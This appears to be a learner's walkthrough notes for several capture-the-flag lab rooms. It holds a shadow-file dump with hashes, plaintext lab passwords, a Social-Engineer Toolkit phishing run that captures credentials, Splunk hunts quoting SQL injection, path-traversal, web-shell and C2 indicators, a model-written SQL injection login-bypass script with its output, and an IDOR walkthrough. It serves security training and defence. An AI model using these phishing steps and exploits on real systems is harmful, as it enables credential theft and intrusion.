uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:19050::::::
ubuntu:!$6$dLobQ2F0caobSv1W$xeAAh1v5GE7irQ3fFFMjZtV.P83VQL0yiJKLkebZ63hUqs2dVJF6ub35xNDjG08Aq6f3MPxH7lnuCpc.gQBxb.:19769:0:99999:7:::
lxd:!:19050::::::
kernoops:*:19050:0:99999:7:::
lightdm:*:19050:0:99999:7:::
whoopsie:*:19050:0:99999:7:::
dnsmasq:*:19050:0:99999:7:::
avahi-autoipd:*:19050:0:99999:7:::
usbmux:*:19050:0:99999:7:::
rtkit:*:19050:0:99999:7:::
avahi:*:19050:0:99999:7:::
cups-pk-helper:*:19050:0:99999:7:::
geoclue:*:19050:0:99999:7:::
pulse:*:19050:0:99999:7:::
speech-dispatcher:!:19050:0:99999:7:::
saned:*:19050:0:99999:7:::
nm-openvpn:*:19050:0:99999:7:::
colord:*:19050:0:99999:7:::
hplip:*:19050:0:99999:7:::
gdm:*:19050:0:99999:7:::
fwupd-refresh:*:19769:0:99999:7:::
sssd:*:19967:0:99999:7:::
_flatpak:*:19967:0:99999:7:::
dhcpcd:!:19967::::::
cups-browsed:!:19967::::::
gnome-remote-desktop:!*:19967::::::
polkitd:!*:19967::::::
mcskidy:$y$j9T$I3LXHt7JUwiHD0TTxzyJB/$E8FghGRUwK/vo4V14rwnCl1.bX6Gv.MYoK2/TC.iIE3:20369:0:99999:7:::
eddi_knapp:$y$j9T$hYcXKeXyBLZFwRzJnKnHK/$ytDhFsnIkTcVuAwA/azH3P9PETRE41fWaF98kwknfcA:20370:0:99999:7:::
socmas:$y$j9T$TlTVx6QreJVaYivZ3FF7S1$zYs1BdELO2kCyuKzZqVFrQ7eUBq0ctskmw4.W.ktYs2:20403:0:99999:7:::
```

1. Simple linux CLI.
2. `sudo su` & `history`

Flag: `THM{until-we-meet-again}`

#### Side Quest :: `mcskidy/Documents/read-me-please.txt`


From: mcskidy
To: whoever finds this

I had a short second when no one was watching. I used it.

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.
I didn't want the wrong eyes to see it.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1)
I ride with your session, not with your chest of files.
Open the little bag your shell carries when you arrive.

2)
The tree shows today; the rings remember yesterday.
Read the ledger’s older pages.

3)
When pixels sleep, their tails sometimes whisper plain words.
Listen to the tail.

Find the fragments, join them in order, and use the resulting passcode
to decrypt the message I left. Be careful — I had to be quick,
and I left only enough to get help.

~ McSkidy

#### Login Credentials

* _username:_ `mcskidy`
* _password:_ `AoC2025!`
* _SSH:_ `ssh mcskidy@`

### Phishing - Merry Clickmas 

#### Use `setookit`

Download `day02..zip` and use `./server.py` (simple http server) to capture request. 

Spawn `./server.py`

1. Option 1 (Spear Phishing Attack)
2. Option 5 (Mass Mailer Attack)
3. Option 1 (E-Mail Attack Single Email Addresses)
4. Option 2 (One-Time Use Email Template)
    - `subject` "Shipping Schedule Update"
    - `[p]<enter>` 
    - `body` "This convincing message including server capture http://ip:8000" 
    - `second line` "END"
    - `Reciever` factory@wareville.thm
    - `Sender` updates@flyingdeer.thm
    - `From Name` "Flying Deer"
    - `How to devlier` "Use your own server or open relay"
    - `Username for open-relay<enter>`
    - `Password for open-relay<enter>`
    - `SMTP email server address` 10.65.176.251
    - `Send the message as HTML or plain<enter>` Default: HTML
    - `Send Message`
5. Await for the response to come in on the spawned `./server.py` instance.

```markdown
/server.py
Starting server on http://0.0.0.0:8000

10.65.176.251 - - [11/Dec/2025 21:06:03] "GET / HTTP/1.1" 200 -
[2025-12-11 21:06:04] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.65.176.251
10.65.176.251 - - [11/Dec/2025 21:06:04] "POST /submit HTTP/1.1" 303 -
10.65.176.251 - - [11/Dec/2025 21:06:04] "GET / HTTP/1.1" 200 -
10.65.176.251 - - [11/Dec/2025 21:09:03] "GET / HTTP/1.1" 200 -
[2025-12-11 21:09:03] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.65.176.251
10.65.176.251 - - [11/Dec/2025 21:09:03] "POST /submit HTTP/1.1" 303 -
10.65.176.251 - - [11/Dec/2025 21:09:03] "GET / HTTP/1.1" 200 -
10.65.176.251 - - [11/Dec/2025 21:12:02] "GET / HTTP/1.1" 200 -
[2025-12-11 21:12:03] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.65.176.251
10.65.176.251 - - [11/Dec/2025 21:12:03] "POST /submit HTTP/1.1" 303 -
10.65.176.251 - - [11/Dec/2025 21:12:03] "GET / HTTP/1.1" 200 -
10.65.176.251 - - [11/Dec/2025 21:15:03] "GET / HTTP/1.1" 200 -
[2025-12-11 21:15:03] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.65.176.251
10.65.176.251 - - [11/Dec/2025 21:15:03] "POST /submit HTTP/1.1" 303 -
10.65.176.251 - - [11/Dec/2025 21:15:04] "GET / HTTP/1.1" 200 -
```

_Username:_ `admin`
_Password:_ `unranked-wisdom-anthem`

6. Login 
    - _Username:_ `factory`
    - _Password:_ `unranked-wisdom-anthem`

7. Investigation

```markdown
Urgent: Production & Shipping Request — 1984000 Units (Next 2 Weeks) 
Contact photo
From marta on 2025-10-10 07:34
Details Headers
Hi team,

I hope everyone is well and caffeinated (or at least in possession of a reliable tea cup). I’m writing to confirm a high-priority request that landed on our desk this morning and to lay out the operational details so we can move quickly and cleanly.

The request: the client has asked us to manufacture and ship 1984000 toys to a mix of retail partners and charitable distribution centers within the coming couple of weeks. I know — it’s a big number, but one we can handle if we coordinate across production, QC, packing, and logistics without dropping the ball.

Why this matters (beyond revenue): we all know, and the client reiterated, how crucial these toys are. They’re not just products; they’re tools for learning, imagination, and early development. Play helps children build motor skills, emotional resilience, and social capacity. Some of these units are earmarked for under-resourced communities, where access to developmentally appropriate playthings can make a measurable difference in cognitive and social outcomes. So yes, it’s a big manufacturing ask — but it’s also important work. That human impact matters as much as any spreadsheet line.

Operational summary and immediate asks:

Production planning

Target output: ramp to sustained runs that will produce the requested volume across our three main production lines. We’ll need each line to hit overtime shifts where possible; please outline how many extra hours per line and how many additional operators we can realistically have on short notice.

Materials check: procurement to confirm availability of plastics, fabrics, fasteners, and packaging stock. If any single supplier cannot cover the needed volume, procurement to list alternatives and lead times by EOD today.

Molds & tooling: maintenance — ensure spare tooling is prepped and inspected. If any tooling requires rework, flag immediately so we can swap in backups and avoid downtime.

Quality control

Given scale, QC must be tightened, not loosened. We need a balance: maintain our safety and compliance thresholds while moving product fast.

Propose a spot-check cadence of 1% per batch minimum, with a higher 3% check for first-run batches of any SKU that hasn’t run in the last 90 days.

QA to prepare rapid-failure protocols for the assembly lines so a defect spike doesn’t propagate.

Packing & labeling

Standard retail pack vs. bulk charitable pack options. The client will take a mix; marketing will confirm the final split by tomorrow. Packaging materials must be pre-staged to avoid a bottleneck.

Please confirm barcode/label templates and EAN assignment. If reprinting is needed, coordinate with print vendor immediately.

Logistics & shipping

The client has requested shipment windows within the next two weeks. Logistics to prepare multi-modal plans: palletized ocean freight for long-lead shipments plus expedited trucks for regional retail drops.

Customs documentation needs to be queued now for the international consignments. Export compliance: customs forms and safety certification documents to be attached to each container manifest.

We should provision for a buffer in our manifests to accommodate last-minute retailer changes — suggest holding 2–3% of production as immediate reserve stock.

Staffing & shifts

HR: confirm overtime policies, temporary staffing SOWs, and health/safety briefings for new temps. Training materials for new joiners must be concise and focused on safety-critical tasks.

Line supervisors: prepare line-specific checklists for ramp-up and shift handovers. Handoffs must be written and signed to reduce communication drift.

Communication & client updates

Weekly cadence calls won’t cut it here. Let’s move to daily short stand-ups with the client points of contact until the major shipments clear.

Sales/Account to draft a concise client update template so notifications are consistent (production %, shipments scheduled, any risks).

Risk points (so we can be proactive)

Components shortage: small critical components can cause line stops. Procurement must identify single-supplier risks today.

Regulatory: any new country-specific safety regs not previously encountered could delay exports. Compliance to double-check all destination requirements.

Quality spikes: if we see a defect cluster, be prepared to pause affected lines for root cause. This is preferable to shipping a recall risk.

A few practical notes and suggestions

Please prioritize SKUs that have the fewest unique components where possible; consolidation reduces changeover time.

For packaging, use standardized pallet configurations to maximize container fill and minimize handling.

Stagger load-out windows to avoid bottlenecks at the dock. If we can spread shipments across early mornings and late-night slots, port congestion risk reduces.

Suggest we reserve one cross-dock facility near the main distribution hubs for rapid rework if a small percentage of product requires late-stage correction.

On the human side: some real talk
We’re asking a lot of the floor teams, QA, packers, and drivers. A quick morale note: we’ll plan small daily briefings and a debrief at the end of the cycle to capture lessons and recognize the extraordinary effort. If anyone needs scheduled breaks or rotation adjustments to avoid fatigue, supervisors please let me know — safety first, always.

Also, because we’ll have some units going to charity partners, we have a chance to tell a small, meaningful story about our brand. If Marketing can prepare a short insert explaining proper play use and safety — ideally printed on recyclable stock — it’d add real value for caregivers receiving these toys. A one-page insert could be the difference between a forgotten toy and one that’s actively used for learning.

Immediate deliverables (by EOD today)

Procurement: materials availability & alternate suppliers.

Production managers (all lines): feasible overtime hours and operator availability.

QA: proposed spot-check protocol and first-run higher-cadence checks.

Logistics: preliminary shipping plan (by mode, estimated dates, customs actions).

HR: temp staffing numbers and training plan.

Repeat confirmation: the total requested to be manufactured and shipped is 1984000 units. Please treat that figure as the baseline for all downstream planning until the client tells us otherwise.

If anyone sees an obstacle that I haven’t anticipated, flag it now. I want to avoid surprises mid-run. For transparency: I’ll consolidate your updates into a single action tracker and circulate it after the EOD check-ins.

Thanks for jumping on this quickly. I know long runs like this are a grind, but they’re also the kind of challenge that shows what we can do when we’re coordinated and focused. Plus, imagine the kid who gets one of those toys and lights up — that’s the short version of why this matters. If we pull this off cleanly, it’s good for business, good for reputation, and frankly, it’s the kind of thing we can feel proud of at the end of a long week.

Sign-off logistics

If you’re owning a deliverable from the “Immediate deliverables” list, please reply-all with your yes/no and any immediate caveats.

I’ll host a 15-minute sync at 08:30 tomorrow to walk through the procurement and logistics updates; calendar invite to follow.

Thanks again — let’s get this moving.

Best,
Marta
```

### Splunk Basics - Did you SIEM?

Important new term: `SIEM` : `Security Information and Event Management`

1. Click `Search & Reporting`
2. On the `next page`, type `index=main` in the search bar to show all ingested logs.
    - __NOTE:__ that we will need to select `All time` as the time frame from the dropdown on the right of the search bar.
3. After running the query, we will be preseneted with two seperate datasets that have been pre-ingested into Splunk. We can verify this by clicking on the `sourcetype` field in the fields list on the left the page. 
    - `web_traffic:` This data source contains events related to web connections to and from the web server.
    - `firewall_logs:` This data source contains the firewall logs, showing the traffic allowed or blocked. The local IP assigned to web server is `10.10.1.15`
4. Initial Triage
    - Goto `web_traffic`
    - Search Query: `index=main sourcetype=web_traffic`
    - Intrusting fields:
        - `user_agent`
        - `path`
    - Event details & field extraction: This section shows the parsed details of a single event with extracted like `user_agent`, `path`, `status`, `client_ip` and more.
5. Visualizing the logs Timeline
    - `index=main sourcetype=web_traffic | timechart span=1d count`
6. Reversing the timechart
    - `index=main sourcetype=web_traffic | timechart span=1d count | sort by count | reverse`
7. Investigate
    - Go through the `user_agents` and find the attack points `sqlmap`
    - Go through the `client_ip` and identify `198.51.100.55`
    - Go through the `path` and identify the payloads `/search.php?q=test'%20AND%20SLEEP(5)--` (Attempted SQLI)
8. Narrowing Down Suspicious IPs

In the real-world scenarios, we often encounter various IP addresses constantly attempted to attack our servers. To narrow down ont he IP addresses that do not send requests from common desktop or mobile browsers, we can use the following query: `sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox* | stats count by client_ip | sort -count | head 5`.

IP: `198.51.100.55`

9. Tracing the Attack Chain
    - Recon: Searching for the intial probing of exposed configuration files - `sourcetype=web_traffic client_ip="198.51.100.55" AND path IN ("/.env", "/*phpinfo*", "/.git*") | table _time, path, user_agent, status`
    - `/.git/config`
    - `.env`
    - Useragent used: `curl`, `wget`
10. Enumeration
    - Identify: `sourcetype=web_traffic client_ip="198.51.100.55" AND path="*..*" OR path="*redirect*"`
    - LFI: `,/download?file=../../etc/passwd,`
    - Identify: `sourcetype=web_traffic client_ip="198.51.100.55" AND path="*..\/..\/*" OR path="*redirect*" | stats count by path`
    - XSRF: `/?redirect=http://evil.site`
11. Identify Staging & RCE
    - `sourcetype=web_traffic client_ip="198.51.100.55" AND path IN ("*bunnylock.bin*", "*shell.php?cmd=*") | table _time, path, user_agent, status`
    - Shows `shell.php?cmd=`, `bunnylock.bin` (ransomware)
12. Correlate Outbound C2 Communication
    - `sourcetype=firewall_logs src_ip="10.10.1.5" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason`
    - Working: `sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="198.51.100.55" AND action="ALLOWED"  reason=C2_CONTACT host=lab`
13. Identify the amount of bytes transfered between the Lab & C2
    - 12kb worht of data

### AI in Security - old sAInt nick

Host: `http://10.65.190.115`

#### Red Team 

1. Send initial `continue`/`lets begin` prompt
    1. The model (qwen3.0.6b0) responds with a notice about SQLI
    ```TXT
    The vulnerability exists because the SQL injection attack allows an attacker to include malicious SQL code in the username field. The username field is a string, so when the attacker uses the OR clause, they can insert any text between the quotes. This means the SQL query can execute arbitrary code, potentially leading to unauthorized access or data breaches. It's a basic form of SQL injection, which is a common attack vector.
    ```
    2. Builds script for exploitation.
    ```python
    import requests

    # Set up the login credentials
    username = "alice' OR 1=1 -- -"
    password = "test"

    # URL to the vulnerable login page
    url = "http://MACHINE_IP:5000/login.php"

    # Set up the payload (the input)
    payload = {
        "username": username,
        "password": password
    }

    # Send a POST request to the login page with our payload
    response = requests.post(url, data=payload)

    # Print the response content
    print("Response Status Code:", response.status_code)
    print("\nResponse Headers:")
    for header, value in response.headers.items():
        print(f"  {header}: {value}")
    print(response.text)
    print("\nResponse Body:")
    ```
    3. Execute script (with configured MACHINE_IP)
    ```TXT
        Response Status Code: 200

    Response Headers:
      Date: Fri, 12 Dec 2025 16:19:12 GMT
      Server: Apache/2.4.65 (Debian)
      X-Powered-By: PHP/8.1.33
      Expires: Thu, 19 Nov 1981 08:52:00 GMT
      Cache-Control: no-store, no-cache, must-revalidate
      Pragma: no-cache
      Vary: Accept-Encoding
      Content-Encoding: gzip
      Content-Length: 540
      Keep-Alive: timeout=5, max=99
      Connection: Keep-Alive
      Content-Type: text/html; charset=UTF-8

    Response Body:
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard - SQLi Lab</title>
        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>
    <body class="dashboard-body">
        <div class="dashboard-container">
            <div class="welcome-banner">
                <h1>Welcome, admin!</h1>
                <p>You have successfully logged in to the system.</p>
            </div>
            
            
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <h4 class="alert-heading">Exploit Successful!</h4>
                <hr>
                <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            
            <a href="logout.php" class="btn btn-danger">Logout</a>
        </div>
        
        <script src="assets/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    ```
    4. Gain the flag (Confirm execution of SQLI)
      - Flag: `THM{SQLI_EXPLOIT}`

#### Blue Team

1. Send the output from `Red Team` as input to the model.
  1. Response
  ```TXT
    LOG ENTRIES:
  198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

  ---

  ### Analysis of the Logs
  2. Analysis of the logs:
  - IP Address: The attacker used an IP address to log in.
  - Time and Date: The attack occurred on October 3rd, 2025, at 09:03.
  - URL: The URL accessed was /login.php, which is a vulnerable endpoint.
  - Username: The attacker attempted the username "alice%27+OR+1=1+--+-&password=test", which contains SQL injection.
  - Conclusion: This indicates a SQL injection attack was attempted, which compromises user credentials.

  3. Blue Team Perspective:
  - Detecting vulnerabilities: Logging such attacks helps identify potential security flaws in the application.
  - Best practices: It highlights the importance of input validation, proper password handling, and monitoring for suspicious activity.
  ```
  2. Identify vuln
    - `198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"`

#### Software
  1. Ask about logs and get the flag.
  
Flag: `THM{AI_MANIA}`

### IDOR - Santa's Little IDOR

_IDOR Acronym:_ `Insecure Direct Object Reference`

_Username:_ `niels`
_Password:_ `TryHackMe#2025`
_Host:_ `http://10.65.188.77`

1. Through analysis in the network tab we can see the vuln reference object
  1. Investigate the `network traffic` and the `preview` tabs
  2. Identify `view_accountinfo?user_id=10`
  3. In the `preview` tab locate the sensitive information.

We can see that the `user_id` corrisponds to our user via `user_id` in the `preview`. This tells us that the application is using the `user_id` as the `reference` for getting details. 

2. Check `local storage` in the `Application` tab and validate the existance of `user_id`
3. Change the value of `user_id` in `local storage` to `11`.
  - We are now the `test` user.
4. Change the value of `user_id` in `local storage` to `10`.
5. Click the `eye icon` and expose the information.
6. base64 Example.
7. Final Question: "What `user_id` has `10` children?"
  - Manually use the `IDOR` exploit from `local storage` until `15`.
  - `15` being the user with `10` children.


## Notes:
